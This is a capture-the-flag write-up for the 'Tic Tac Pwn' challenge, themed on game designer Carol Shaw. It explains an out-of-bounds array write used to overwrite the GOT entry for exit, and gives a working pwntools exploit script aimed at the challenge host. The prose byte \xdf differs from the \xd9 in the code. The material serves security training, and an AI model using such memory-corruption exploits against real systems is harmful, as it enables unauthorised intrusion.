# Carol Shaw #

## Prompt

[Carol Shaw](https://en.wikipedia.org/wiki/Carol_Shaw) (born 1955) is one of the first female game designers and programmers in the video game industry.She is best known for creating the Atari 2600 vertically scrolling shooter River Raid (1982) for Activision. She worked for Atari, Inc. from 1978 to 1980 where she designed multiple games including 3-D Tic-Tac-Toe (1978) and Video Checkers (1980), both for the Atari VCS before it was renamed to the 2600. She left game development in 1984 and retired in 1990. - [Wikipedia Entry](https://en.wikipedia.org/wiki/Carol_Shaw)

Chal: Play Tic Tac Pwn and return the flag to [this video game pioneer](https://www.youtube.com/watch?v=GtIIaTeMspU)

## Solution

There is an array index abuse issue that you can write outside the bounds of the board variable. Since there is a ``win`` function at 0x4011df, you can just overwrite the ``got`` entry for ``exit`` by changing your character to ``\x40,\x11,\xdf`` on three separate games and writing to the appropriate offsets from the ``got[exit]-board`` entries.

```python
from pwn import *

binary = './tic-tac-toe.bin'

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary,checksec=False)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('0.cloud.chals.io',27824)
    else:
        return process(e.path)

p = start()

def lose_game(b,pos):
   p.sendlineafter(b'>>>',b)
   p.sendlineafter(b'>>>',b'-1 %i' %pos)
   p.sendlineafter(b'>>>',b'0 0')
   p.sendlineafter(b'>>>',b'-1 %i' %pos)
   p.sendlineafter(b'>>>',b'0 1')
   p.sendlineafter(b'>>>',b'-1 %i' %pos)
   p.sendlineafter(b'>>>',b'0 2')


lose_game(b'\x40',-83)
p.sendlineafter(b'>>>',b'Y')
lose_game(b'B',-77)
p.sendlineafter(b'>>>',b'Y')

lose_game(b'\x11',-84)
p.sendlineafter(b'>>>',b'Y')
lose_game(b'B',-77)
p.sendlineafter(b'>>>',b'Y')

lose_game(b'\xd9',-85)
p.sendlineafter(b'>>>',b'N')


p.interactive()
```
